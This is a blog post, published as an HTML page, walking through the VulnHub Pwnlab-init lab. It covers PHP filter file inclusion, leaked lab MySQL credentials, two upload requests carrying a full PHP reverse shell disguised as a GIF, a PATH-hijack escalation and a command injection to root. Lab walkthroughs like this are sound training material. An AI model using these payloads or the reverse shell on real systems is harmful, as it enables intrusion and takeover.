@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="en" prefix="og: https://ogp.me/ns#">
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible"
+      content="IE=edge">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0" />
+<meta name="description"
+      content="Adventures of Functional Mediocrity" />
+<meta name="keywords"
+      content="zola, theme, ink, hugo-ink" /> 
+
+<title>John Tuyen | Pwnlab-init</title>
+<meta
+  property="og:title"
+  content="John Tuyen | Pwnlab-init"
+/>
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://johntuyen.com/posts/vulnhub-pwnlabinit/" />
+<meta property="og:description" content="Adventures of Functional Mediocrity" />
+<meta property="og:image" content="" />
+<meta property="og:image:url" content="" />
+<meta property="og:image:secure_url" content="" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Pwnlab-init" />
+<meta name="twitter:description" content="Adventures of Functional Mediocrity" />
+<meta property="twitter:image" content="" />
+
+<link rel="alternate"
+          type="application/rss+xml"
+          title="John Tuyen"
+          href="https://johntuyen.com/atom.xml">
+    <link rel="preconnect"
+          href="https://fonts.googleapis.com">
+    <link rel="preconnect"
+          href="https://fonts.gstatic.com"
+          crossorigin>
+    <!-- <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">  -->
+    <link href="https://fonts.googleapis.com/css2?family=Andada+Pro&display=swap&family=Playfair+Display"
+          rel="stylesheet">
+    <link rel="stylesheet"
+          href="https://johntuyen.com/base.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.28.0/feather.min.js"
+            integrity="sha512-7x3zila4t2qNycrtZ31HO0NnJr8kg2VI67YLoRSyi9hGhRN66FHYWr7Axa9Y1J9tGYHVBPqIjSE1ogHrJTz51g=="
+            crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <header>
+        <a class="site-name"
+           href="/">
+            <h1>John Tuyen</h1>
+        </a>
+        <div class="site-description">
+            <p>Adventures of Functional Mediocrity</p>
+        </div>
+        <nav>
+            <div class="links"> 
+            <a 
+                href="https://johntuyen.com/ ">About</a> 
+            <a 
+                href="https://johntuyen.com/posts/ ">Posts</a> 
+            <a 
+                href="https://johntuyen.com/gallery/ ">Gallery</a> 
+            <a 
+                href="https://johntuyen.com/tags/ ">Tags</a> 
+            <a 
+                href="https://johntuyen.com/search/ ">Search</a> 
+            </div>
+        </nav>
+    </header>
+    <article>
+    
+
+<section class="post">
+  <div class="post-header">
+    <div class="meta">
+      <div class="date">
+        <span class="day">16</span>
+        <span class="rest">May 19</span>
+      </div>
+    </div>
+
+    <div class="matter">
+      <h1 class="title">Pwnlab-init </h1>
+    </div>
+  </div>
+    
+  <article><ol>
+<li>
+<p>There are two ports that you can attack remotely, port 80 and 3306.</p>
+<p>Port 80 attacks:</p>
+<ul>
+<li>Tried simple passwords to attempt bypass login.</li>
+<li>No luck with RFI attack.</li>
+</ul>
+<p>Port 3306 attacks:</p>
+<ul>
+<li>No luck with bruteforcing MySQL login using <code>rockyou.txt</code></li>
+</ul>
+</li>
+<li>
+<p>I should be more careful with reading and php filter LFI attack. At the end of the URL, you notice in LFI cheatsheets, it will show <code>/etc/passwd</code> such as:</p>
+<pre data-lang="html" style="background-color:#2b303b;color:#c0c5ce;" class="language-html "><code class="language-html" data-lang="html"><span>http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+</span></code></pre>
+<p>You don't necessarily need the directory traversal to test if you can execute the php filter attack. You can first query the index page and see if it works first then traverse the directories and see if you can gather system files.</p>
+<p>I've decoded the following files for further inspection:</p>
+<pre data-lang="html" style="background-color:#2b303b;color:#c0c5ce;" class="language-html "><code class="language-html" data-lang="html"><span>http://192.168.1.16/?page=php://filter/convert.base64-encode/resource=index
+</span></code></pre>
+<pre data-lang="html" style="background-color:#2b303b;color:#c0c5ce;" class="language-html "><code class="language-html" data-lang="html"><span>http://192.168.1.16/?page=php://filter/convert.base64-encode/resource=login
+</span></code></pre>
+<pre data-lang="html" style="background-color:#2b303b;color:#c0c5ce;" class="language-html "><code class="language-html" data-lang="html"><span>http://192.168.1.16/?page=php://filter/convert.base64-encode/resource=upload
+</span></code></pre>
+<pre data-lang="html" style="background-color:#2b303b;color:#c0c5ce;" class="language-html "><code class="language-html" data-lang="html"><span>http://192.168.1.16/?page=php://filter/convert.base64-encode/resource=config
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/vulnhub-pwnlabinit/pwnlab-lfi.png" alt="pwnlab-lfi.png" /></p>
+<p>The config page makes sense now because when navigating to the config.php page, it will show up as blank and in the next step it explains why.</p>
+</li>
+<li>
+<p>The <code>config.php</code> page contains the MySQL credentials.</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span style="color:#ab7967;">&lt;?php
+</span><span>$</span><span style="color:#bf616a;">server	  </span><span>= &quot;</span><span style="color:#a3be8c;">localhost</span><span>&quot;;
+</span><span>$</span><span style="color:#bf616a;">username </span><span>= &quot;</span><span style="color:#a3be8c;">root</span><span>&quot;;
+</span><span>$</span><span style="color:#bf616a;">password </span><span>= &quot;</span><span style="color:#a3be8c;">H4u%QJ_H99</span><span>&quot;;
+</span><span>$</span><span style="color:#bf616a;">database </span><span>= &quot;</span><span style="color:#a3be8c;">Users</span><span>&quot;;
+</span><span style="color:#ab7967;">?&gt;
+</span></code></pre>
+</li>
+<li>
+<p>Using <code>mysql</code> and connect to the remote database as root. Once logged in, there is a database named users and below is the output of the database. The password is encoded with base64 format.</p>
+<pre data-lang="sql" style="background-color:#2b303b;color:#c0c5ce;" class="language-sql "><code class="language-sql" data-lang="sql"><span>MySQL [Users]&gt; </span><span style="color:#b48ead;">select </span><span style="color:#bf616a;">* </span><span style="color:#b48ead;">from</span><span> users;
+</span><span>+</span><span style="color:#65737e;">------+------------------+
+</span><span>| user | pass             |
+</span><span>+</span><span style="color:#65737e;">------+------------------+
+</span><span>| kent | Sld6WHVCSkpOeQ== (JWzXuBJJNy) |
+</span><span>| mike | U0lmZHNURW42SQ== (SIfdsTEn6I) |
+</span><span>| kane | aVN2NVltMkdSbw== (iSv5Ym2GRo) |
+</span><span>+</span><span style="color:#65737e;">------+------------------+
+</span><span style="color:#d08770;">3</span><span> rows in </span><span style="color:#b48ead;">set</span><span> (</span><span style="color:#d08770;">0</span><span>.</span><span style="color:#d08770;">01</span><span> sec)
+</span></code></pre>
+</li>
+<li>
+<p>Open up Burpsuite and create a repeater with this snippet below. There are 3 important parts of this snippet. </p>
+<ul>
+<li><code>.gif</code> extension - To bypass the listed whitelist extensions.</li>
+<li><code>image/gif</code> as content type - To bypass the mime type checker.</li>
+<li><code>GIF87a</code> header before the php tag - To fake the server thinking the file really is receiving a gif format by checking the file header.</li>
+</ul>
+<p>Executing the custom Burpsuite remote command to the server will generate a broken image link.</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>POST /?page=upload HTTP/1.1
+</span><span>Host: 192.168.16.129
+</span><span>User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
+</span><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span><span>Accept-Language: en-US,en;q=0.5
+</span><span>Accept-Encoding: gzip, deflate
+</span><span>Referer: http://192.168.16.129/?page=upload
+</span><span>Cookie: PHPSESSID=9vq5im5401eplh2imdb7tjoar0
+</span><span>Connection: close
+</span><span>Upgrade-Insecure-Requests: 1
+</span><span>Content-Type: multipart/form-data; boundary=---------------------------6484244853519591111205641705
+</span><span>Content-Length: 5848
+</span><span>
+</span><span>-----------------------------6484244853519591111205641705
+</span><span>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;php-reverse-shell.gif&quot;
+</span><span>Content-Type: image/gif
+</span><span>
+</span><span>GIF87a
+</span><span>&lt;?php
+</span><span>
+</span><span>set_time_limit (0);
+</span><span>$VERSION = &quot;1.0&quot;;
+</span><span>$ip = &#39;192.168.16.130&#39;;  // CHANGE THIS
+</span><span>$port = 4444;       // CHANGE THIS
+</span><span>$chunk_size = 1400;
+</span><span>$write_a = null;
+</span><span>$error_a = null;
+</span><span>$shell = &#39;uname -a; w; id; /bin/sh -i&#39;;
+</span><span>$daemon = 0;
+</span><span>$debug = 0;
+</span><span>
+</span><span>//
+</span><span>// Daemonise ourself if possible to avoid zombies later
+</span><span>//
+</span><span>
+</span><span>// pcntl_fork is hardly ever available, but will allow us to daemonise
+</span><span>// our php process and avoid zombies.  Worth a try...
+</span><span>if (function_exists(&#39;pcntl_fork&#39;)) {
+</span><span>	// Fork and have the parent process exit
+</span><span>	$pid = pcntl_fork();
+</span><span>	
+</span><span>	if ($pid == -1) {
+</span><span>		printit(&quot;ERROR: Can&#39;t fork&quot;);
+</span><span>		exit(1);
+</span><span>	}
+</span><span>	
+</span><span>	if ($pid) {
+</span><span>		exit(0);  // Parent exits
+</span><span>	}
+</span><span>
+</span><span>	// Make the current process a session leader
+</span><span>	// Will only succeed if we forked
+</span><span>	if (posix_setsid() == -1) {
+</span><span>		printit(&quot;Error: Can&#39;t setsid()&quot;);
+</span><span>		exit(1);
+</span><span>	}
+</span><span>
+</span><span>	$daemon = 1;
+</span><span>} else {
+</span><span>	printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);
+</span><span>}
+</span><span>
+</span><span>// Change to a safe directory
+</span><span>chdir(&quot;/&quot;);
+</span><span>
+</span><span>// Remove any umask we inherited
+</span><span>umask(0);
+</span><span>
+</span><span>//
+</span><span>// Do the reverse shell...
+</span><span>//
+</span><span>
+</span><span>// Open reverse connection
+</span><span>$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+</span><span>if (!$sock) {
+</span><span>	printit(&quot;$errstr ($errno)&quot;);
+</span><span>	exit(1);
+</span><span>}
+</span><span>
+</span><span>// Spawn shell process
+</span><span>$descriptorspec = array(
+</span><span>   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from
+</span><span>   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to
+</span><span>   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to
+</span><span>);
+</span><span>
+</span><span>$process = proc_open($shell, $descriptorspec, $pipes);
+</span><span>
+</span><span>if (!is_resource($process)) {
+</span><span>	printit(&quot;ERROR: Can&#39;t spawn shell&quot;);
+</span><span>	exit(1);
+</span><span>}
+</span><span>
+</span><span>// Set everything to non-blocking
+</span><span>// Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t
+</span><span>stream_set_blocking($pipes[0], 0);
+</span><span>stream_set_blocking($pipes[1], 0);
+</span><span>stream_set_blocking($pipes[2], 0);
+</span><span>stream_set_blocking($sock, 0);
+</span><span>
+</span><span>printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);
+</span><span>
+</span><span>while (1) {
+</span><span>	// Check for end of TCP connection
+</span><span>	if (feof($sock)) {
+</span><span>		printit(&quot;ERROR: Shell connection terminated&quot;);
+</span><span>		break;
+</span><span>	}
+</span><span>
+</span><span>	// Check for end of STDOUT
+</span><span>	if (feof($pipes[1])) {
+</span><span>		printit(&quot;ERROR: Shell process terminated&quot;);
+</span><span>		break;
+</span><span>	}
+</span><span>
+</span><span>	// Wait until a command is end down $sock, or some
+</span><span>	// command output is available on STDOUT or STDERR
+</span><span>	$read_a = array($sock, $pipes[1], $pipes[2]);
+</span><span>	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+</span><span>
+</span><span>	// If we can read from the TCP socket, send
+</span><span>	// data to process&#39;s STDIN
+</span><span>	if (in_array($sock, $read_a)) {
+</span><span>		if ($debug) printit(&quot;SOCK READ&quot;);
+</span><span>		$input = fread($sock, $chunk_size);
+</span><span>		if ($debug) printit(&quot;SOCK: $input&quot;);
+</span><span>		fwrite($pipes[0], $input);
+</span><span>	}
+</span><span>
+</span><span>	// If we can read from the process&#39;s STDOUT
+</span><span>	// send data down tcp connection
+</span><span>	if (in_array($pipes[1], $read_a)) {
+</span><span>		if ($debug) printit(&quot;STDOUT READ&quot;);
+</span><span>		$input = fread($pipes[1], $chunk_size);
+</span><span>		if ($debug) printit(&quot;STDOUT: $input&quot;);
+</span><span>		fwrite($sock, $input);
+</span><span>	}
+</span><span>
+</span><span>	// If we can read from the process&#39;s STDERR
+</span><span>	// send data down tcp connection
+</span><span>	if (in_array($pipes[2], $read_a)) {
+</span><span>		if ($debug) printit(&quot;STDERR READ&quot;);
+</span><span>		$input = fread($pipes[2], $chunk_size);
+</span><span>		if ($debug) printit(&quot;STDERR: $input&quot;);
+</span><span>		fwrite($sock, $input);
+</span><span>	}
+</span><span>}
+</span><span>
+</span><span>fclose($sock);
+</span><span>fclose($pipes[0]);
+</span><span>fclose($pipes[1]);
+</span><span>fclose($pipes[2]);
+</span><span>proc_close($process);
+</span><span>
+</span><span>// Like print, but does nothing if we&#39;ve daemonised ourself
+</span><span>// (I can&#39;t figure out how to redirect STDOUT like a proper daemon)
+</span><span>function printit ($string) {
+</span><span>	if (!$daemon) {
+</span><span>		print &quot;$string\n&quot;;
+</span><span>	}
+</span><span>}
+</span><span>
+</span><span>?&gt; 
+</span><span>
+</span><span>
+</span><span>
+</span><span>
+</span><span>-----------------------------6484244853519591111205641705
+</span><span>Content-Disposition: form-data; name=&quot;submit&quot;
+</span><span>
+</span><span>Upload
+</span><span>-----------------------------6484244853519591111205641705--
+</span><span>
+</span></code></pre>
+</li>
+<li>
+<p>If you take a look at the Burpsuite result, you'll notice the server created a link. </p>
+<pre data-lang="html" style="background-color:#2b303b;color:#c0c5ce;" class="language-html "><code class="language-html" data-lang="html"><span>&lt;</span><span style="color:#bf616a;">img </span><span style="color:#d08770;">src</span><span>=&quot;</span><span style="color:#a3be8c;">upload/3208fd203ca8fdfa13bc98a4832c1396.gif</span><span>&quot;&gt;&lt;</span><span style="color:#bf616a;">br </span><span>/&gt;&lt;/</span><span style="color:#bf616a;">center</span><span>&gt;
+</span></code></pre>
+<p>Try opening the file by using a Burpsuite GET request and it will dump the file as though it's a plain text file. The problem with this if you try to access the file using the browser, it will give you an error <code>cannot be displayed because it contains errors</code>. This part can be misleading if you haven't seen this type of method of bypass before because it leads you to think it's caused by the <code>GIF87a</code> header.</p>
+<p>In reality, if you reviewed the code carefully for the page <code>index.php</code>, you'll notice a <code>lang</code> cookie check code uses an <code>include</code> statement. This piece of code lacks file sanitation and will load a file that you want to run.</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>POST /?page=upload HTTP/1.1
+</span><span>Host: 192.168.16.129
+</span><span>User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
+</span><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span><span>Accept-Language: en-US,en;q=0.5
+</span><span>Accept-Encoding: gzip, deflate
+</span><span>Referer: http://192.168.16.129/?page=upload
+</span><span>Cookie: PHPSESSID=9vq5im5401eplh2imdb7tjoar0; lang=../upload/3208fd203ca8fdfa13bc98a4832c1396.gif
+</span><span>Connection: close
+</span><span>Upgrade-Insecure-Requests: 1
+</span><span>Cache-Control: max-age=0
+</span><span>Content-Type: multipart/form-data; boundary=---------------------------3116742302425600613338252
+</span><span>Content-Length: 5838
+</span><span>
+</span><span>-----------------------------3116742302425600613338252
+</span><span>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;php-reverse-shell.gif&quot;
+</span><span>Content-Type: image/gif
+</span><span>
+</span><span>GIF87a
+</span><span>&lt;?php
+</span><span>
+</span><span>set_time_limit (0);
+</span><span>$VERSION = &quot;1.0&quot;;
+</span><span>$ip = &#39;192.168.16.130&#39;;  // CHANGE THIS
+</span><span>$port = 4444;       // CHANGE THIS
+</span><span>$chunk_size = 1400;
+</span><span>$write_a = null;
+</span><span>$error_a = null;
+</span><span>$shell = &#39;uname -a; w; id; /bin/sh -i&#39;;
+</span><span>$daemon = 0;
+</span><span>$debug = 0;
+</span><span>
+</span><span>//
+</span><span>// Daemonise ourself if possible to avoid zombies later
+</span><span>//
+</span><span>
+</span><span>// pcntl_fork is hardly ever available, but will allow us to daemonise
+</span><span>// our php process and avoid zombies.  Worth a try...
+</span><span>if (function_exists(&#39;pcntl_fork&#39;)) {
+</span><span>	// Fork and have the parent process exit
+</span><span>	$pid = pcntl_fork();
+</span><span>	
+</span><span>	if ($pid == -1) {
+</span><span>		printit(&quot;ERROR: Can&#39;t fork&quot;);
+</span><span>		exit(1);
+</span><span>	}
+</span><span>	
+</span><span>	if ($pid) {
+</span><span>		exit(0);  // Parent exits
+</span><span>	}
+</span><span>
+</span><span>	// Make the current process a session leader
+</span><span>	// Will only succeed if we forked
+</span><span>	if (posix_setsid() == -1) {
+</span><span>		printit(&quot;Error: Can&#39;t setsid()&quot;);
+</span><span>		exit(1);
+</span><span>	}
+</span><span>
+</span><span>	$daemon = 1;
+</span><span>} else {
+</span><span>	printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);
+</span><span>}
+</span><span>
+</span><span>// Change to a safe directory
+</span><span>chdir(&quot;/&quot;);
+</span><span>
+</span><span>// Remove any umask we inherited
+</span><span>umask(0);
+</span><span>
+</span><span>//
+</span><span>// Do the reverse shell...
+</span><span>//
+</span><span>
+</span><span>// Open reverse connection
+</span><span>$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+</span><span>if (!$sock) {
+</span><span>	printit(&quot;$errstr ($errno)&quot;);
+</span><span>	exit(1);
+</span><span>}
+</span><span>
+</span><span>// Spawn shell process
+</span><span>$descriptorspec = array(
+</span><span>   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from
+</span><span>   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to
+</span><span>   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to
+</span><span>);
+</span><span>
+</span><span>$process = proc_open($shell, $descriptorspec, $pipes);
+</span><span>
+</span><span>if (!is_resource($process)) {
+</span><span>	printit(&quot;ERROR: Can&#39;t spawn shell&quot;);
+</span><span>	exit(1);
+</span><span>}
+</span><span>
+</span><span>// Set everything to non-blocking
+</span><span>// Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t
+</span><span>stream_set_blocking($pipes[0], 0);
+</span><span>stream_set_blocking($pipes[1], 0);
+</span><span>stream_set_blocking($pipes[2], 0);
+</span><span>stream_set_blocking($sock, 0);
+</span><span>
+</span><span>printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);
+</span><span>
+</span><span>while (1) {
+</span><span>	// Check for end of TCP connection
+</span><span>	if (feof($sock)) {
+</span><span>		printit(&quot;ERROR: Shell connection terminated&quot;);
+</span><span>		break;
+</span><span>	}
+</span><span>
+</span><span>	// Check for end of STDOUT
+</span><span>	if (feof($pipes[1])) {
+</span><span>		printit(&quot;ERROR: Shell process terminated&quot;);
+</span><span>		break;
+</span><span>	}
+</span><span>
+</span><span>	// Wait until a command is end down $sock, or some
+</span><span>	// command output is available on STDOUT or STDERR
+</span><span>	$read_a = array($sock, $pipes[1], $pipes[2]);
+</span><span>	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+</span><span>
+</span><span>	// If we can read from the TCP socket, send
+</span><span>	// data to process&#39;s STDIN
+</span><span>	if (in_array($sock, $read_a)) {
+</span><span>		if ($debug) printit(&quot;SOCK READ&quot;);
+</span><span>		$input = fread($sock, $chunk_size);
+</span><span>		if ($debug) printit(&quot;SOCK: $input&quot;);
+</span><span>		fwrite($pipes[0], $input);
+</span><span>	}
+</span><span>
+</span><span>	// If we can read from the process&#39;s STDOUT
+</span><span>	// send data down tcp connection
+</span><span>	if (in_array($pipes[1], $read_a)) {
+</span><span>		if ($debug) printit(&quot;STDOUT READ&quot;);
+</span><span>		$input = fread($pipes[1], $chunk_size);
+</span><span>		if ($debug) printit(&quot;STDOUT: $input&quot;);
+</span><span>		fwrite($sock, $input);
+</span><span>	}
+</span><span>
+</span><span>	// If we can read from the process&#39;s STDERR
+</span><span>	// send data down tcp connection
+</span><span>	if (in_array($pipes[2], $read_a)) {
+</span><span>		if ($debug) printit(&quot;STDERR READ&quot;);
+</span><span>		$input = fread($pipes[2], $chunk_size);
+</span><span>		if ($debug) printit(&quot;STDERR: $input&quot;);
+</span><span>		fwrite($sock, $input);
+</span><span>	}
+</span><span>}
+</span><span>
+</span><span>fclose($sock);
+</span><span>fclose($pipes[0]);
+</span><span>fclose($pipes[1]);
+</span><span>fclose($pipes[2]);
+</span><span>proc_close($process);
+</span><span>
+</span><span>// Like print, but does nothing if we&#39;ve daemonised ourself
+</span><span>// (I can&#39;t figure out how to redirect STDOUT like a proper daemon)
+</span><span>function printit ($string) {
+</span><span>	if (!$daemon) {
+</span><span>		print &quot;$string\n&quot;;
+</span><span>	}
+</span><span>}
+</span><span>
+</span><span>?&gt; 
+</span><span>
+</span><span>
+</span><span>
+</span><span>-----------------------------3116742302425600613338252
+</span><span>Content-Disposition: form-data; name=&quot;submit&quot;
+</span><span>
+</span><span>Upload
+</span><span>-----------------------------3116742302425600613338252--
+</span></code></pre>
+</li>
+<li>
+<p>You should be getting a reverse shell at this point.</p>
+</li>
+<li>
+<p>Running linuxprivchecker and linenum scripts showed nothing out of the ordinary. Start to try basic enumeration using the current information I've already uncovered, mysql database login passwords and see if I could uncover data stored in home directories.</p>
+</li>
+<li>
+<p>Kane's login has succeeded:</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>su kane
+</span></code></pre>
+<p>Kane's home folder contains a binary file named <code>msgmike</code>.  When executing the binary file, it tries to create a file in Mike's home folder: </p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>/home/mike/msg.txt
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/vulnhub-pwnlabinit/pwnlab-msgmike.png" alt="pwnlab-msgmike.png" /></p>
+</li>
+<li>
+<p>Using the PATH environment trick, we can escalate our privileges to Mike's account. How this works is when you add the current directory to the PATH environment variable, it will read the <code>cat</code> file that you've created and contains a bash shell execution. </p>
+<p><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">Read more about PATH escalation.</a></p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>echo &quot;/bin/bash&quot; &gt; cat
+</span><span>chmod +x cat
+</span><span>export PATH=.:$PATH
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/vulnhub-pwnlabinit/pwnlab-path-privesc.png" alt="pwnlab-path-privesc.png" /></p>
+</li>
+<li>
+<p>Now that we're in Mike's account, his home folder contains a file called <code>msg2root</code>. When executing <code>msg2root</code>, it prompts a message &quot;Message for root&quot;. Whatever you type, it appears to just repeat itself back like the command <code>echo</code>. Taking a closer look at the binary, you will notice that at the end of the <code>/root/messages.txt</code> there is a semi colon. This could mean you can execute an additional command afterwards. All you have to do is execute a shell and you are now as root.</p>
+<p><img src="https://johntuyen.com/posts/vulnhub-pwnlabinit/pwnlab-msg2root.png" alt="pwnlab-msg2root.png" /></p>
+<p><img src="https://johntuyen.com/posts/vulnhub-pwnlabinit/pwnlab-msg2root-2.png" alt="pwnlab-msg2root-2.png" /></p>
+<p><img src="https://johntuyen.com/posts/vulnhub-pwnlabinit/pwnlab-rooted.png" alt="pwnlab-rooted.png" /></p>
+</li>
+</ol>
+</article>
+
+  
+    
+  
+  <ul class="tags">
+    
+      <li><a href='https://johntuyen.com/tags/vulnhub'>vulnhub</a></li>
+    
+  </ul>
+  
+  
+    
+</section>
+</article>
+    <footer>
+        <div class="social">
+            <ul> 
+                 
+                <li>
+                    <a href="https://github.com/jtuyen"
+                       title="Github" rel="me"><i data-feather="github"></i></a>
+                </li>
+                 
+                 
+                <li>
+                    <a href="https://twitter.com/jtuyen"
+                       title="Twitter"
+                       rel="me"><i data-feather="twitter"></i></a>
+                </li>
+                
+                
+                
+                <li>
+                    <a href="https://johntuyen.com/atom.xml"
+                       title="John Tuyen"><i data-feather="rss"></i></a>
+                </li>
+            </ul>
+        </div>
+        <p> © John Tuyen 2024
+
+        
+        <br>Powered by <a target="_blank" href="https://getzola.org/">Zola</a>. Theme: <a target="_blank" href="https://github.com/jimmyff/zola-inky">Inky</a>.
+        </p>
+    </footer>
+    <script>
+        feather.replace();
+    </script> 
+    </body>
+</html>
